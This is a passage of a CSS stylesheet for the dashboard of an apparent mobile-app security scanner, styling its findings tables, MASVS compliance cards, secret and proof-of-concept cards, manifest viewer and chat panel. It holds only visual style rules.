  background: transparent; color: var(--muted); border: 0; border-radius: 5px;
  cursor: pointer; transition: all .15s;
}
.src-tab:hover{color: var(--text-2)}
.src-tab.active{ background: var(--bg); color: var(--text); box-shadow: 0 1px 3px rgba(0,0,0,.3) }

/* URL form */
.url-form{
  display: flex; gap: 8px; margin-bottom: 12px;
}
.url-input{
  flex: 1; padding: 12px 14px; font-size: 13px;
  background: var(--bg); border: 1px solid var(--border); border-radius: 7px;
  color: var(--text); font-family: var(--mono); outline: none;
  transition: border-color .15s, box-shadow .15s;
}
.url-input:focus{border-color: var(--accent); box-shadow: 0 0 0 3px rgba(47,129,247,.2)}
.url-form .btn{padding: 11px 18px; font-size: 13px; white-space: nowrap}
.url-hint{
  font-size: 11.5px; color: var(--muted); line-height: 1.6;
  background: var(--panel-2); border: 1px solid var(--border);
  border-radius: 7px; padding: 10px 12px;
}
.url-hint b{color: var(--text-2); font-weight:600}
.url-status{
  margin-top: 12px; padding: 12px; border-radius: 7px;
  font-size: 12px; font-family: var(--mono); line-height: 1.5;
  background: var(--panel-2); border: 1px solid var(--border); color: var(--text-2);
  white-space: pre-wrap; word-break: break-word;
}
.url-status.error{ background: rgba(248,81,73,.08); border-color: rgba(248,81,73,.4); color: #f8a193 }
.url-status.success{ background: rgba(63,185,80,.08); border-color: rgba(63,185,80,.4); color: #8ed99c }
.url-status.working{ background: rgba(210,153,34,.08); border-color: rgba(210,153,34,.4); color: #e6c476 }

.dropzone{
  border: 1.5px dashed var(--border);
  border-radius: 12px;
  padding: 48px 24px;
  background: linear-gradient(180deg, var(--panel) 0%, var(--panel-2) 100%);
  cursor:pointer; transition: all .15s ease;
  text-align: center; position: relative; overflow: hidden;
}
.dropzone::before{
  content:""; position:absolute; inset:0;
  background: radial-gradient(circle at 50% 0%, rgba(47,129,247,.08) 0%, transparent 60%);
  pointer-events:none;
}
.dropzone:hover, .dropzone.over{
  border-color: var(--accent); background: var(--panel-2);
  transform: translateY(-1px);
  box-shadow: 0 4px 12px rgba(47,129,247,.15);
}
.dz-icon{
  font-size: 36px; margin-bottom: 14px; color: var(--accent);
  opacity: .85;
}
.dz-title{font-size:15px; font-weight:600; color: var(--text); margin-bottom: 4px}
.dz-sub{font-size:12px; color: var(--muted)}
.cap-grid{
  margin-top: 28px;
  display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px;
  text-align: left;
}
@media (max-width: 880px){ .cap-grid{grid-template-columns: repeat(2,1fr)} }
.cap{
  background: var(--panel); border: 1px solid var(--border-2);
  border-radius: 8px; padding: 12px 14px;
  font-size: 11px; color: var(--muted); line-height: 1.45;
  transition: border-color .12s, transform .12s;
}
.cap:hover{border-color: var(--border); transform: translateY(-1px)}
.cap b{color: var(--text); display:block; margin-bottom:3px; font-size:12px; font-weight:600}
.privacy-banner{
  margin-top: 22px; text-align: left;
  background: rgba(47,129,247,.04);
  border: 1px solid rgba(47,129,247,.2);
  border-radius: 8px; padding: 14px 18px;
}
.privacy-banner b{color: var(--accent-2)}

/* Reports tab */
.reports-summary{
  display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px;
  margin-bottom: 16px;
}
@media (max-width: 880px){ .reports-summary{grid-template-columns: repeat(2,1fr)} }
.reports-stat{
  background: var(--panel); border: 1px solid var(--border-2);
  border-radius: 8px; padding: 14px 16px; text-align: center;
}
.reports-stat .value{
  font-size: 24px; font-weight: 700; color: var(--text);
  font-family: var(--mono); letter-spacing: -0.5px;
}
.reports-stat .label{
  font-size: 10.5px; text-transform: uppercase; letter-spacing: 1.2px;
  color: var(--muted); margin-top: 6px;
}
.reports-list{display: flex; flex-direction: column; gap: 10px}
.report-card{
  background: var(--panel); border: 1px solid var(--border);
  border-radius: 8px; padding: 14px 18px;
  transition: border-color .12s;
}
.report-card:hover{border-color: var(--accent)}
.report-head{
  display: flex; align-items: center; gap: 14px;
  flex-wrap: wrap; margin-bottom: 10px;
}
.report-titles{flex: 1; min-width: 200px}
.report-name{font-size: 14px; font-weight: 600; color: var(--text); margin-bottom: 2px}
.report-meta{font-size: 11.5px; color: var(--muted); font-family: var(--mono)}
.report-sev-strip{display: flex; gap: 6px; flex-wrap: wrap}
.report-sev-strip .sev-tag{font-size: 10px; padding: 2px 6px}
.report-actions{
  display: flex; gap: 6px; flex-wrap: wrap; align-items: center;
  border-top: 1px solid var(--border-2); padding-top: 10px;
}
.report-actions .btn{font-size: 11px; padding: 4px 10px; text-decoration: none}
.report-actions .btn.danger{
  background: rgba(248,81,73,.08); border-color: rgba(248,81,73,.3); color: #ff8a93;
}
.report-actions .btn.danger:hover{
  background: rgba(248,81,73,.18); border-color: rgba(248,81,73,.5); color: #fff;
}
.platform-pill.android{background: rgba(63,185,80,.12); color: #7ee097; border: 1px solid rgba(63,185,80,.3)}
.platform-pill.ios{background: rgba(47,129,247,.12); color: var(--accent-2); border: 1px solid rgba(47,129,247,.3)}

/* Tool tiles (Tools & Frameworks tab) */
.tools-grid{
  display: grid; gap: 12px;
  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  margin-bottom: 18px;
}
.tool-tile{
  background: var(--panel); border: 1px solid var(--border);
  border-radius: 8px; padding: 14px 16px; cursor: pointer;
  transition: border-color .12s, transform .12s, box-shadow .12s;
  position: relative;
}
.tool-tile:hover{
  border-color: var(--accent);
  transform: translateY(-1px);
  box-shadow: 0 4px 12px rgba(47,129,247,.1);
}
.tool-name{
  font-weight: 600; font-size: 13px; color: var(--text);
  margin-bottom: 4px;
}
.tool-desc{
  font-size: 11.5px; color: var(--muted-2); line-height: 1.45;
}
.tool-tag{
  display: inline-block; margin-top: 8px;
  font-size: 9.5px; font-weight: 700; letter-spacing: 1.4px;
  padding: 2px 7px; border-radius: 3px;
  text-transform: uppercase; font-family: var(--mono);
  background: rgba(47,129,247,.1); color: var(--accent-2);
  border: 1px solid rgba(47,129,247,.25);
}

/* Confidence pills */
.conf-pill{
  display: inline-block; padding: 1px 7px; border-radius: 3px;
  font-size: 9px; font-weight: 700; letter-spacing: .5px; text-transform: uppercase;
  vertical-align: middle; border: 1px solid; margin-left: 6px;
}
.conf-pill.confirmed{background:rgba(63,185,80,.12);color:#3fb950;border-color:rgba(63,185,80,.35)}
.conf-pill.likely{background:rgba(210,153,34,.12);color:#d29922;border-color:rgba(210,153,34,.35)}
.conf-pill.possible{background:rgba(110,118,129,.15);color:#8b949e;border-color:rgba(110,118,129,.35)}

/* Platform pill */
.platform-pill{
  display:inline-flex;align-items:center;gap:6px;
  padding:6px 12px;border-radius:6px;
  background:var(--panel);border:1px solid var(--border);
  font-size:11px;font-weight:700;letter-spacing:.5px;text-transform:uppercase;
  color:var(--muted);font-family:var(--mono);
}
.platform-pill.android{color:#3fb950;border-color:rgba(63,185,80,.4);background:rgba(63,185,80,.08)}
.platform-pill.ios{color:#58a6ff;border-color:rgba(88,166,255,.4);background:rgba(88,166,255,.08)}

/* Logout button */
.logout-btn{
  background:transparent;border:1px solid var(--border);color:var(--muted);
  padding:5px 12px;border-radius:5px;font-size:11px;font-weight:600;
  letter-spacing:.5px;text-transform:uppercase;cursor:pointer;transition:all .12s;
}
.logout-btn:hover{border-color:var(--bad);color:var(--bad)}

.progress-strip{
  position: absolute; top: 44px; left: 240px; right: 0;
  height: 2px; background: var(--border-2); display: none;
}
.progress-strip.on{display:block}
.progress-strip > div{
  height: 100%; width: 0%; background: var(--accent);
  transition: width .3s ease;
}

/* ========== Header bar (within view) ========== */
.view-header{
  display: flex; align-items: center; gap: 14px;
  padding: 14px 22px;
  border-bottom: 1px solid var(--border);
  background: var(--panel);
  flex-shrink: 0;
  min-height: 64px;
}
.view-title{font-size:16px; font-weight:600; line-height: 1.3}
.view-meta{font-size:11.5px; color:var(--muted); font-family: var(--mono); margin-top: 3px}
.view-spacer{flex:1}
.view-actions{display:flex; gap:6px; align-items: center}

.btn{
  display: inline-flex; align-items: center; gap: 6px;
  background: var(--panel-2);
  border: 1px solid var(--border);
  color: var(--text);
  padding: 5px 11px; border-radius: 5px;
  font-size: 12px; cursor: pointer;
  transition: border-color .12s, background .12s;
}
.btn:hover{border-color: var(--accent); background: var(--panel)}
.btn:disabled{opacity:.5; cursor: not-allowed}
.btn.primary{background: var(--accent); border-color: var(--accent); color:white}
.btn.primary:hover{background: var(--accent-2); border-color: var(--accent-2)}
.btn.danger{border-color: var(--bad); color: var(--bad)}
.btn.success{border-color: var(--good); color: var(--good)}
.btn.sm{padding: 3px 7px; font-size: 11px}

/* ========== KPI strip ========== */
.kpi-strip{
  display:grid; grid-template-columns: repeat(5, 1fr); gap: 1px;
  background: var(--border-2);
  border-bottom: 1px solid var(--border);
}
.kpi{
  background: var(--panel);
  padding: 10px 16px;
  display: flex; flex-direction: column; gap: 2px;
}
.kpi .label{font-size:10px; text-transform:uppercase; letter-spacing:1.2px; color:var(--muted-2)}
.kpi .value{font-size:22px; font-weight:600; font-family: var(--mono)}
.kpi.crit .value{color: var(--crit)}
.kpi.high .value{color: var(--high)}
.kpi.med  .value{color: var(--med)}
.kpi.low  .value{color: var(--low)}
.kpi.info .value{color: var(--info)}

/* Attack Surface Grid */
.overview-grid{
  display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin-bottom: 14px;
}
@media (max-width: 1100px){
  .overview-grid{grid-template-columns: 1fr}
}
.surface-grid{
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
  gap: 10px;
}
.surface-card{
  background: var(--panel-2); border: 1px solid var(--border);
  border-radius: 8px; padding: 16px 18px;
  transition: border-color .15s, transform .1s;
  display: flex; flex-direction: column; justify-content: space-between;
  min-height: 86px;
}
.surface-card:hover{border-color: var(--accent); transform: translateY(-1px)}
.surface-card .value{
  font-size: 28px; font-weight: 700; font-family: var(--mono);
  color: var(--text); line-height: 1;
}
.surface-card .label{
  font-size: 10.5px; text-transform: uppercase; letter-spacing: 1.2px;
  color: var(--muted); margin-top: 10px; line-height: 1.3;
}

/* MASVS Compliance grid */
.masvs-grid{
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
  gap: 8px;
}
.masvs-card{
  background: var(--panel-2); border: 1px solid var(--border);
  border-left: 3px solid var(--low);
  border-radius: 8px; padding: 12px 14px;
}
.masvs-card.masvs-pass{border-left-color: var(--low)}
.masvs-card.masvs-minor{border-left-color: var(--info)}
.masvs-card.masvs-warn{border-left-color: var(--med)}
.masvs-card.masvs-fail{border-left-color: var(--crit)}
.masvs-head{display: flex; gap: 10px; align-items: center; margin-bottom: 6px}
.masvs-status{
  font-size: 18px; font-weight: 700; line-height: 1;
  width: 28px; height: 28px; display: grid; place-items: center;
  border-radius: 50%; flex-shrink: 0;
}
.masvs-pass .masvs-status{background: rgba(63,185,80,.15); color: var(--low)}
.masvs-minor .masvs-status{background: rgba(140,148,158,.15); color: var(--muted)}
.masvs-warn .masvs-status{background: rgba(210,153,34,.15); color: var(--med)}
.masvs-fail .masvs-status{background: rgba(248,81,73,.15); color: var(--crit)}
.masvs-label{font-size: 13px; font-weight: 600; color: var(--text)}
.masvs-key{font-size: 10px; color: var(--muted); font-family: var(--mono); letter-spacing: .5px}
.masvs-status-line{
  font-size: 9.5px; font-weight: 700; letter-spacing: 1.4px;
  text-transform: uppercase; margin-bottom: 6px;
}
.masvs-pass .masvs-status-line{color: var(--low)}
.masvs-minor .masvs-status-line{color: var(--muted)}
.masvs-warn .masvs-status-line{color: var(--med)}
.masvs-fail .masvs-status-line{color: var(--crit)}
.masvs-counts{
  font-size: 11px; color: var(--muted-2);
  display: flex; gap: 8px; flex-wrap: wrap;
}
.masvs-counts.dim{color: var(--muted)}
.masvs-counts span{display: inline-flex; gap: 3px; align-items: center}
.masvs-counts b{color: var(--text); font-weight: 700; font-family: var(--mono)}
.masvs-counts .mc-c{color: var(--crit)}
.masvs-counts .mc-h{color: var(--high)}
.masvs-counts .mc-m{color: var(--med)}
.masvs-counts .mc-l{color: var(--low)}

/* CVE / CVSS pills */
.cvss-pill{
  display:inline-block; padding: 2px 6px; font-size: 10px; font-weight: 700;
  font-family: var(--mono); border-radius: 3px;
  background: rgba(248,81,73,.12); color: #f8a193;
  border: 1px solid rgba(248,81,73,.3);
}
.cve-pill{
  display:inline-block; padding: 2px 6px; font-size: 10px; font-weight: 600;
  font-family: var(--mono); border-radius: 3px;
  background: rgba(210,153,34,.12); color: #e6c476;
  border: 1px solid rgba(210,153,34,.3);
}

/* Secret cards in Secrets tab */
.secret-card{
  background: var(--bg); border: 1px solid var(--border);
  border-left: 3px solid var(--crit);
  border-radius: 8px; padding: 14px 16px; margin-bottom: 10px;
}
.secret-card .secret-head{display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:10px}
.secret-card .secret-title{font-weight:600; font-size:14px; color:var(--text); flex:1; min-width:200px}
.secret-card .secret-evidence{
  background: var(--panel); border: 1px solid var(--border-2); border-radius: 6px;
  padding: 8px 12px; font-family: var(--mono); font-size: 11.5px;
  color: #a8efc1; word-break: break-all; line-height: 1.5;
  margin-bottom: 8px;
}
.secret-card .secret-impact{font-size: 12px; color: var(--text-2); line-height:1.55; margin-bottom:10px}
.secret-card .secret-impact b{color: var(--text)}
.secret-card .secret-actions{display:flex; gap:6px}
.pattern-pill{
  display:inline-block; padding: 3px 9px; margin: 2px;
  font-size: 11px; font-family: var(--mono);
  background: var(--panel-2); color: var(--text-2);
  border: 1px solid var(--border); border-radius: 12px;
}

/* Funny upload modal */
.funny-modal{
  position: fixed; inset: 0; z-index: 9999;
  display: none; align-items: center; justify-content: center;
  background: rgba(13,17,23,.85); backdrop-filter: blur(4px);
}
.funny-modal.on{display: flex}
.funny-card{
  background: var(--panel); border: 1px solid var(--border);
  border-radius: 16px; padding: 36px 40px;
  min-width: 380px; max-width: 480px; text-align: center;
  box-shadow: 0 24px 80px rgba(0,0,0,.6);
}
.funny-spinner{
  width: 60px; height: 60px; margin: 0 auto 16px;
  animation: funny-pulse 1.6s ease-in-out infinite;
  filter: drop-shadow(0 4px 16px rgba(47,129,247,.5));
}
@keyframes funny-pulse{
  0%, 100%{ transform: scale(1); opacity: 1 }
  50%{ transform: scale(1.08); opacity: .85 }
}
.funny-percent{
  font-size: 38px; font-weight: 700; color: var(--accent-2);
  font-family: var(--mono); letter-spacing: .5px; margin-bottom: 14px;
  text-shadow: 0 0 20px rgba(88,166,255,.4);
}
.funny-bar{
  height: 6px; background: var(--bg);
  border-radius: 99px; overflow: hidden; margin-bottom: 18px;
}
.funny-bar > div{
  height: 100%;
  background: linear-gradient(90deg, var(--accent), var(--accent-2));
  border-radius: 99px;
  transition: width .4s cubic-bezier(.4,0,.2,1);
  box-shadow: 0 0 12px rgba(88,166,255,.4);
}
.funny-msg{
  font-size: 14px; color: var(--text-2); font-style: italic;
  line-height: 1.5; min-height: 42px;
  animation: funny-fade .5s ease-in;
}
@keyframes funny-fade{
  from{opacity: .3} to{opacity: 1}
}

/* ========== Manifest viewer modal ========== */
.manifest-pre{
  margin: 0; padding: 18px 22px;
  font-family: var(--mono); font-size: 12px; line-height: 1.6;
  color: var(--text-2); white-space: pre;
  background: transparent;
}
.x-tag{color: #79c0ff; font-weight: 500}
.x-attr{color: #ffa657}
.x-val{color: #a5d6ff}
.x-eq{color: #8b949e}
.x-punct{color: #8b949e}
.x-com{color: #6e7681; font-style: italic}
.comp-highlight{
  background: rgba(255, 210, 61, .08);
  border-radius: 4px;
  padding: 4px 6px;
  display: inline-block;
  outline: 1px solid rgba(255, 210, 61, .35);
  box-shadow: 0 0 0 9999px rgba(0,0,0,0); /* maintains layout */
}
.comp-row:hover{background: var(--panel-2)}
.comp-row td:first-child code{font-size: 11.5px}
.exp-pill{
  display: inline-block; padding: 2px 8px;
  font-size: 10px; font-weight: 600; letter-spacing: .5px;
  background: rgba(248,81,73,.14); color: #ff8a93;
  border: 1px solid rgba(248,81,73,.32); border-radius: 4px;
  text-transform: uppercase;
}
.btn.sm{font-size: 11px; padding: 4px 9px}

/* ========== Manifest tab layout ========== */
#pane-manifest{display: none; flex-direction: column; flex: 1; overflow: hidden}
#pane-manifest.active{display: flex}
.manifest-toolbar{
  display: flex; align-items: center; justify-content: space-between;
  padding: 10px 16px;
  border-bottom: 1px solid var(--border);
  background: var(--panel);
  flex-shrink: 0;
}
.manifest-filename{
  font-family: var(--mono); font-size: 13px; font-weight: 600;
  color: var(--accent-2); letter-spacing: .3px;
}
.manifest-search-input{
  background: var(--bg); border: 1px solid var(--border);
  color: var(--text); border-radius: 4px; padding: 5px 10px;
  font-size: 12px; width: 220px; font-family: var(--mono);
}
.manifest-search-input:focus{outline: 1px solid var(--accent)}
.manifest-tab-layout{
  display: grid; grid-template-columns: 280px 1fr;
  flex: 1; overflow: hidden;
}
.manifest-toc{
  background: var(--panel); border-right: 1px solid var(--border);
  overflow-y: auto; padding: 8px 0;
}
.toc-section{padding: 12px 16px 4px}
.toc-section-h{
  font-size: 10.5px; font-weight: 700; letter-spacing: 1.2px;
  text-transform: uppercase; color: var(--muted);
  padding-bottom: 6px; border-bottom: 1px solid var(--border-2);
  margin-bottom: 6px;
  display: flex; justify-content: space-between; align-items: center;
}
.toc-section-h .count{color: var(--accent-2); font-weight: 600}
.toc-item{
  padding: 5px 10px; cursor: pointer; border-radius: 4px;
  font-family: var(--mono); font-size: 11.5px;
  color: var(--text-2); margin: 1px 6px;
  display: flex; align-items: center; gap: 6px;
  word-break: break-all; line-height: 1.4;
}
.toc-item:hover{background: var(--panel-2); color: var(--text)}
.toc-item.exported::before{
  content: ''; width: 5px; height: 5px;
  background: var(--high); border-radius: 50%; flex-shrink: 0;
}
.toc-item:not(.exported)::before{
  content: ''; width: 5px; height: 5px;
  background: var(--border-2); border-radius: 50%; flex-shrink: 0;
}
.manifest-tab-body{overflow: auto; background: var(--bg)}
.manifest-tab-body .manifest-pre{
  margin: 0; padding: 18px 22px;
  font-family: var(--mono); font-size: 12px; line-height: 1.6;
  color: var(--text-2); white-space: pre;
  background: transparent;
}
.search-hit{background: rgba(255, 210, 61, 0.25); color: #ffe27a; border-radius: 2px}
.search-hit-active{background: #ffd23d; color: #000; border-radius: 2px}

/* ========== Component cards (rich version) ========== */
.comp-card{
  background: var(--panel); border: 1px solid var(--border);
  border-radius: 8px; padding: 14px 18px; margin-bottom: 10px;
  border-left: 3px solid var(--border-2);
  transition: border-color .12s;
}
.comp-card.exported{border-left-color: var(--high)}
.comp-card.exported.has-perm{border-left-color: var(--med)}
.comp-card-head{display: flex; align-items: center; gap: 10px; margin-bottom: 8px; flex-wrap: wrap}
.comp-card-name{
  font-family: var(--mono); font-size: 13px; font-weight: 600;
  color: var(--text); flex: 1; min-width: 200px; word-break: break-all;
}
.comp-card-tag{
  font-size: 10px; font-weight: 700; letter-spacing: 1px;
  text-transform: uppercase; color: var(--accent-2);
  background: rgba(47,129,247,.08); padding: 2px 8px;
  border: 1px solid rgba(47,129,247,.3); border-radius: 4px;
  font-family: var(--mono);
}
.comp-meta-row{
  display: flex; flex-wrap: wrap; gap: 14px;
  font-size: 11.5px; color: var(--text-2); margin-bottom: 8px;
}
.comp-meta-row .k{color: var(--muted); margin-right: 4px}
.comp-meta-row .v{font-family: var(--mono); color: var(--text-2)}
.comp-filter{
  background: var(--panel-2); border: 1px solid var(--border-2);
  border-radius: 6px; padding: 8px 12px; margin-top: 6px;
  font-size: 11.5px; line-height: 1.6;
}
.comp-filter .if-row{display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 3px}
.comp-filter .k{
  font-size: 10px; text-transform: uppercase; letter-spacing: 1px;
  color: var(--muted); width: 70px; flex-shrink: 0; padding-top: 2px;
  font-weight: 600;
}
.comp-filter .v{font-family: var(--mono); color: var(--text-2)}
.if-tag{
  display: inline-block; padding: 1px 6px; margin-right: 4px;
  background: var(--bg); border: 1px solid var(--border);
  border-radius: 3px; font-family: var(--mono); font-size: 10.5px;
  color: var(--accent-2);
}
.comp-jump-link{
  font-size: 11px; color: var(--muted); text-decoration: none;
  font-family: var(--mono); margin-left: auto; padding: 2px 8px;
  border-radius: 4px;
}
.comp-jump-link:hover{background: var(--panel-2); color: var(--accent-2)}

.comp-toolbar{
  display: flex; gap: 8px; margin-bottom: 12px; align-items: center;
  flex-wrap: wrap;
}
.comp-filter-btn{
  background: var(--panel-2); border: 1px solid var(--border);
  color: var(--text-2); padding: 5px 12px; border-radius: 4px;
  font-size: 11.5px; cursor: pointer; font-family: inherit;
}
.comp-filter-btn:hover{border-color: var(--accent); color: var(--text)}
.comp-filter-btn.active{
  background: rgba(47,129,247,.1); border-color: var(--accent);
  color: var(--accent-2);
}

/* ========== Tab content area ========== */
.view-content{
  flex: 1; overflow: hidden;
  display: flex;
}
.view-pane{
  flex: 1; overflow-y: auto;
  display: none;
}
.view-pane.active{display: block}

/* ========== Findings table ========== */
.findings-layout{
  display: grid;
  grid-template-columns: 1fr 0px;
  height: 100%;
  transition: grid-template-columns .2s ease;
}
.findings-layout.detail-open{
  grid-template-columns: 1fr 480px;
}
.findings-list{overflow-y:auto; border-right: 1px solid var(--border)}
.findings-detail{
  overflow-y:auto;
  background: var(--panel);
  border-left: 1px solid var(--border);
  display: none;
}
.findings-layout.detail-open .findings-detail{display: block}

.tools-row{
  display:flex; align-items:center; gap: 8px;
  padding: 8px 16px; border-bottom: 1px solid var(--border);
  background: var(--panel);
  position: sticky; top: 0; z-index: 5;
}
.tools-row input.search{
  flex: 1; max-width: 320px;
  background: var(--bg);
  border: 1px solid var(--border);
  color: var(--text);
  padding: 5px 10px; border-radius: 5px;
  font-size: 12px;
  font-family: var(--mono);
}
.tools-row input.search:focus, .tools-row select:focus{outline: 1px solid var(--accent)}
.tools-row select{
  background: var(--bg); border: 1px solid var(--border); color: var(--text);
  padding: 5px 10px; border-radius: 5px; font-size: 12px;
}
.tools-row .count{font-size: 11px; color: var(--muted); font-family: var(--mono)}

table.tbl{
  width:100%; border-collapse: collapse; font-size: 12px;
}
.tbl th{
  text-align:left; padding: 6px 12px;
  background: var(--panel-2); color: var(--muted);
  font-weight: 500; font-size: 10px;
  text-transform: uppercase; letter-spacing: 1px;
  border-bottom: 1px solid var(--border);
  position: sticky; top: 41px;
}
.tbl td{
  padding: 8px 12px;
  border-bottom: 1px solid var(--border-2);
  vertical-align: top;
}
.tbl tr{cursor: pointer}
.tbl tr:hover td{background: var(--panel-2)}
.tbl tr.active td{background: #1d2638; outline: 1px solid var(--accent)}

.sev-tag{
  display: inline-block;
  font-size: 9px; font-weight: 700;
  padding: 2px 6px; border-radius: 3px;
  letter-spacing: 1px; font-family: var(--mono);
  border: 1px solid;
}
.sev-tag.critical{background: rgba(248,81,73,.12); color: var(--crit); border-color: rgba(248,81,73,.5)}
.sev-tag.high    {background: rgba(219,109,40,.12); color: var(--high); border-color: rgba(219,109,40,.5)}
.sev-tag.medium  {background: rgba(210,153,34,.12); color: var(--med);  border-color: rgba(210,153,34,.5)}
.sev-tag.low     {background: rgba(47,129,247,.12); color: var(--low);  border-color: rgba(47,129,247,.5)}
.sev-tag.info    {background: rgba(110,118,129,.12); color: var(--info); border-color: rgba(110,118,129,.5)}

.cwe-tag{
  font-size: 10px; color: var(--muted);
  font-family: var(--mono);
  background: var(--bg); border: 1px solid var(--border-2);
  padding: 1px 6px; border-radius: 3px; margin-right: 4px;
}

/* ========== Detail panel ========== */
.detail-head{
  padding: 14px 18px; border-bottom: 1px solid var(--border);
  position: sticky; top: 0; background: var(--panel); z-index: 3;
}
.detail-head .title{font-size: 14px; font-weight: 600; margin: 6px 0}
.detail-head .close{
  position: absolute; top: 12px; right: 14px;
  background: transparent; border: none; color: var(--muted);
  cursor: pointer; font-size: 18px; padding: 0; width: 24px; height: 24px;
}
.detail-head .close:hover{color: var(--text)}
.detail-body{padding: 14px 18px}
.detail-body section{margin-bottom: 18px}
.detail-body h4{
  font-size: 10px; text-transform: uppercase; letter-spacing: 1.4px;
  color: var(--muted); margin-bottom: 6px; font-weight: 600;
}
.detail-body p{font-size: 12px; color: var(--text-2); margin-bottom: 4px}

pre, .code{
  background: var(--bg); border: 1px solid var(--border-2);
  padding: 10px 12px; border-radius: 5px;
  font-family: var(--mono); font-size: 11px;
  color: #98c379; overflow-x: auto;
  white-space: pre-wrap; word-break: break-all;
  line-height: 1.5;
}
code.inline{
  background: var(--bg); padding: 1px 5px; border-radius: 3px;
  color: #98c379; font-family: var(--mono); font-size: 11px;
  border: 1px solid var(--border-2);
}

/* ========== Generic content boxes ========== */
.content-pad{padding: 18px 22px; max-width: 1400px; margin: 0 auto}
.box{
  background: var(--panel); border: 1px solid var(--border);
  border-radius: 8px; padding: 18px 20px; margin-bottom: 14px;
}
.box h3{
  font-size: 12px; font-weight: 600; letter-spacing: 1.2px;
  text-transform: uppercase; color: var(--muted-2);
  margin-bottom: 14px; padding-bottom: 10px;
  border-bottom: 1px solid var(--border-2);
}
.box .sub{font-size: 11px; color: var(--muted); margin-bottom: 10px}
.row{display:flex; gap: 8px; align-items: center; flex-wrap: wrap}

/* Overview chart panels: equal height, vertically centered chart content */
.overview-grid > .box{
  margin-bottom: 0;
  display: flex; flex-direction: column;
  min-height: 280px;
}
.overview-grid > .box > div:last-child{
  flex: 1;
  display: flex; align-items: center; justify-content: center;
}
.overview-grid > .box svg{display: block; max-width: 100%; max-height: 220px}

.banner{
  background: var(--panel); border: 1px solid var(--border);
  border-radius: 5px; padding: 8px 12px;
  font-size: 12px; margin-bottom: 12px;
  display: flex; align-items: center; gap: 8px;
}
.banner.warn{border-left: 3px solid var(--warn)}
.banner.ok{border-left: 3px solid var(--good)}
.banner.bad{border-left: 3px solid var(--bad)}

/* ========== PoC cards ========== */
.poc{
  background: var(--panel);
  border: 1px solid var(--border);
  border-left: 3px solid var(--info);
  border-radius: 5px; padding: 12px 14px; margin-bottom: 8px;
}
.poc.severity-critical{border-left-color: var(--crit)}
.poc.severity-high    {border-left-color: var(--high)}
.poc.severity-medium  {border-left-color: var(--med)}
.poc.severity-low     {border-left-color: var(--low)}
.poc-head{display:flex; align-items:center; gap: 8px; flex-wrap: wrap; margin-bottom: 6px}
.poc-title{font-weight: 600; font-size: 13px; flex:1}
.poc-why{font-size: 12px; color: var(--text-2); margin: 4px 0}
.poc-impact{font-size: 12px; color: var(--warn); margin: 4px 0}
.poc-files{margin-top: 8px}
.file-pill{
  display: inline-flex; align-items: center; gap: 5px;
  background: var(--panel-2); border: 1px solid var(--border-2);
  padding: 3px 8px; border-radius: 4px;
  font-family: var(--mono); font-size: 11px;
  color: var(--accent-2); margin-right: 4px; margin-bottom: 4px;
  text-decoration: none;
}
.file-pill:hover{border-color: var(--accent); text-decoration: none}

.confidence-pill{
  font-family: var(--mono); font-size: 10px; font-weight: 600;
  padding: 2px 7px; border-radius: 3px; border: 1px solid;
  letter-spacing: .8px;
}
.confidence-pill.verified{background: rgba(63,185,80,.12); color: var(--good); border-color: rgba(63,185,80,.5)}
.confidence-pill.failed  {background: var(--panel-2); color: var(--muted); border-color: var(--border)}
.confidence-pill.static  {background: var(--panel-2); color: var(--muted); border-color: var(--border)}
.confidence-pill[data-c="needs-device"]{background: rgba(210,153,34,.12); color: var(--med); border-color: rgba(210,153,34,.5)}

/* ========== Status bar ========== */
.statusbar{
  grid-area: statusbar;
  background: var(--panel);
  border-top: 1px solid var(--border);
  display: flex; align-items: center;
  padding: 0 12px; gap: 16px;
  font-size: 11px; color: var(--muted);
  font-family: var(--mono);
}
.statusbar .item{display:flex; align-items:center; gap: 6px}
.statusbar .dot{width: 6px; height: 6px; border-radius: 50%; background: var(--muted-2)}
.statusbar .dot.on{background: var(--good)}
.statusbar .dot.warn{background: var(--warn)}

/* ========== Chat ========== */
.chat-wrap{display:flex; flex-direction:column; height: 100%; padding: 16px 20px}
.chat-msgs{
  flex:1; overflow-y:auto;
  background: var(--panel); border: 1px solid var(--border);
  border-radius: 6px; padding: 14px;
  margin-bottom: 10px;
}
.chat-bubble{
  margin-bottom: 10px;
  padding: 8px 12px; border-radius: 6px;
  max-width: 82%; white-space: pre-wrap; line-height: 1.5;
  font-size: 12px;
}
.chat-bubble.user{
  background: var(--accent); color: white;
  margin-left: auto;
}
.chat-bubble.bot{background: var(--panel-2); border: 1px solid var(--border-2)}
.chat-md{font-size: 13px; line-height: 1.65; white-space: pre-wrap; word-wrap: break-word}
.chat-md b{color: var(--text); font-weight: 700}
.chat-md .chat-h3{
  font-size: 14px; font-weight: 700; color: var(--accent-2);
  margin: 14px 0 6px; letter-spacing: .3px;
  border-bottom: 1px solid var(--border-2); padding-bottom: 4px;
}
.chat-md .chat-h3:first-child{margin-top: 0}
.chat-code{
  margin: 10px 0;
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 6px;
  overflow: hidden;
}
.chat-code-head{
  display: flex; justify-content: space-between; align-items: center;
  padding: 6px 12px;
  background: rgba(47,129,247,.06);
  border-bottom: 1px solid var(--border-2);
  font-size: 10px; letter-spacing: 1.2px; text-transform: uppercase;
  color: var(--muted-2); font-family: var(--mono);
}
.chat-code-lang{font-weight: 600; color: var(--accent-2)}
.chat-code-copy{
  background: transparent; border: 1px solid var(--border);
  color: var(--text-2); padding: 2px 8px; border-radius: 3px;
  font-size: 10.5px; cursor: pointer; font-family: inherit;
}
.chat-code-copy:hover{background: var(--panel); color: var(--text)}
.chat-code pre{
  margin: 0; padding: 12px 14px;
  font-family: var(--mono); font-size: 11.5px; line-height: 1.55;
  color: #c8e1ff; overflow-x: auto; white-space: pre;
  background: transparent; border: 0;
}
.chat-bubble pre{
  background: var(--bg); border: 1px solid var(--border-2);
  padding: 10px; border-radius: 4px; margin-top: 6px;
  font-family: var(--mono); font-size: 11px; line-height: 1.5;
  white-space: pre-wrap; word-break: break-word; overflow-x: auto;
